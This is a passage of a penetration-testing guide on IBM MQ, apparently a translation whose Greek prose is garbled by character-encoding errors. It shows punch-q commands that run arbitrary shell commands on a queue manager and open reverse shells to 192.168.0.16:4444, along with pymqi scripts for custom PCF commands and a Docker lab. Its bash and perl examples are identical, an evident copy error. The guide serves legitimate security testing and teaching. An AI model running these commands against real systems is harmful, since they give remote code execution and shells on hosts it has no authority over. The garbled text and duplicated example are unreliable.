> Î¥Ï€Î¬ÏÏ‡ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î¼Î¹Î± Ï€ÏÎ¿ÎµÎ¹Î´Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î³Î¹Î± Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® ÏƒÏ„Î± Î­Î³Î³ÏÎ±Ï†Î±: *"Î ÏÎ¿ÏƒÎ¿Ï‡Î®: Î‘Ï…Ï„Î® Î· ÎµÎ½Ï„Î¿Î»Î® ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· ÎµÎ½Ï„Î¿Î»Î® Î¼Îµ ÎµÎ¾Î¿Ï…ÏƒÎ¯Î± mqm. Î•Î¬Î½ Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ·Î¸Î¿ÏÎ½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î³Î¹Î± Ï„Î· Ï‡ÏÎ®ÏƒÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚, Î­Î½Î±Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï‚ Î® Î±Ï€ÏÏŒÏƒÎµÎºÏ„Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î¿ÏÎ¯ÏƒÎµÎ¹ Î¼Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Ï€Î¿Ï… Î¸Î± Î²Î»Î¬ÏˆÎµÎ¹ Ï„Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Î® Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÎ±Ï‚, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î´Î¹Î±Î³ÏÎ¬Ï†Î¿Î½Ï„Î±Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± Î±ÏÏ‡ÎµÎ¯Î±."*
>
> *Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·: Ï€Î¬Î½Ï„Î± ÏƒÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· Ï„Î¿Ï… IBM MQ (Administration Reference), Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î­Î½Î± HTTP endpoint ÏƒÏ„Î¿ `/admin/action/qmgr/{qmgrName}/mqsc` Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î·Î½ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î· ÎµÎ½Ï„Î¿Î»Î® MQSC Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ (`DEFINE SERVICE`). Î‘Ï…Ï„ÏŒ Ï„Î¿ Î¸Î­Î¼Î± Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ ÎºÎ±Î»Ï…Ï†Î¸ÎµÎ¯ Î±ÎºÏŒÎ¼Î± ÎµÎ´Ï.*

Î— Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± / Î´Î¹Î±Î³ÏÎ±Ï†Î® Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î¼Îµ PCF Î³Î¹Î± Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³Î¯Î½ÎµÎ¹ Î¼Îµ **punch-q**:

**Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± 1**
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> Î£Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Ï„Î¿Ï… IBM MQ, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î· ÎµÎ½Ï„Î¿Î»Î® ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Î·ÎºÎµ ÎµÏ€Î¹Ï„Ï…Ï‡ÏÏ‚:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: Î— ÎµÎ½Ï„Î¿Î»Î® '808544aa7fc94c48' Î­Ï‡ÎµÎ¹ Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÎ¹. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ Ï„Î± Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„Î± Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î± ÏƒÏ„Î· Î¼Î·Ï‡Î±Î½Î® (ÎµÎ´Ï `/bin/doesnotexist` ... Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹):
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**ÎÎ± ÎµÎ¯ÏƒÏ„Îµ Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ¿Î¯ ÏŒÏ„Î¹ Î· ÎµÎºÎºÎ¯Î½Î·ÏƒÎ· Ï„Î¿Ï… Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Î±ÏƒÏÎ³Ï‡ÏÎ¿Î½Î·. ÎˆÏ„ÏƒÎ¹ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ Î­Î½Î± Î´ÎµÏÏ„ÎµÏÎ¿ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿ Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±** ***(listener for reverse shell, file creation on different service, data exfiltration through network ...)***

**Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± 2**

Î“Î¹Î± ÎµÏÎºÎ¿Î»Î· reverse shell, **punch-q** Ï€ÏÎ¿Ï„ÎµÎ¯Î½ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´ÏÎ¿ payloads reverse shell:

* ÎˆÎ½Î± Î¼Îµ bash
* ÎˆÎ½Î± Î¼Îµ perl

*Î¦Ï…ÏƒÎ¹ÎºÎ¬ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿ Î¼Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `execute`.*

Î“Î¹Î± bash:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
Î“Î¹Î± perl:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### Custom PCF

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏÎµÏ…Î½Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· Ï„Î¿Ï… IBM MQ ÎºÎ±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· **pymqi** python Î³Î¹Î± Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· ÎµÎ½Ï„Î¿Î»Î® PCF Ï€Î¿Ï… Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÏƒÏ„Î¿ **punch-q**.

**Example:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
Î‘Î½ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± ÏƒÏ„Î±Î¸ÎµÏÏÎ½, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î±Ï„ÏÎ­Î¾ÎµÏ„Îµ ÏƒÏ„Î·Î½ [Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors).

> *Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î³Î¹Î± [`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (Î”ÎµÎºÎ±Î´Î¹ÎºÏŒ = 73). Î§ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `MQCA_CLUSTER_NAME` (Î”ÎµÎºÎ±Î´Î¹ÎºÏŒ = 2029) Î· Î¿Ï€Î¿Î¯Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ `*` (ÎˆÎ³Î³ÏÎ±Ï†Î¿: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Error")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## Î ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Î´Î¿ÎºÎ¹Î¼ÏÎ½

Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ ÎºÎ±Î¹ Ï„Î¹Ï‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… IBM MQ, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ„Îµ Î­Î½Î± Ï„Î¿Ï€Î¹ÎºÏŒ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ Docker:

1. ÎˆÏ‡Î¿Î½Ï„Î±Ï‚ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ ÏƒÏ„Î¿ ibm.com ÎºÎ±Î¹ cloud.ibm.com.
2. Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ IBM MQ Î¼Îµ:
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
ÎšÎ±Ï„Î¬ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·, Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· ÎµÎ¯Î½Î±Î¹ `admin` ÎºÎ±Î¹ Î¿ ÎºÏ‰Î´Î¹ÎºÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ `passw0rd` (ÎœÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ `MQ_ADMIN_PASSWORD`). Î•Î´Ï, Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Î¿Ï…ÏÏÎ½ Î­Ï‡ÎµÎ¹ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ ÏƒÎµ `MYQUEUEMGR` (Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® `MQ_QMGR_NAME`).

Î ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï„Î¿ IBM MQ ÏƒÎµ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î¼Îµ Ï„Î¹Ï‚ Î¸ÏÏÎµÏ‚ Ï„Î¿Ï… ÎµÎºÏ„ÎµÎ¸ÎµÎ¹Î¼Î­Î½ÎµÏ‚:
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> ÎŸÎ¹ Ï€Î±Î»Î¹Î­Ï‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½ ÎµÎ¹ÎºÏŒÎ½Ï‰Î½ docker Ï„Î¿Ï… IBM MQ Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·: https://hub.docker.com/r/ibmcom/mq/.

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [mgeeky's gist - "Î ÏÎ±ÎºÏ„Î¹ÎºÎ­Ï‚ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÎµÎ¹Ï‚ Î³Î¹Î± Ï„Î·Î½ Î”Î¹ÎµÎ¯ÏƒÎ´Ï…ÏƒÎ· ÏƒÏ„Î¿ IBM MQ"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [Î¤ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· IBM MQ](https://www.ibm.com/docs/en/ibm-mq)
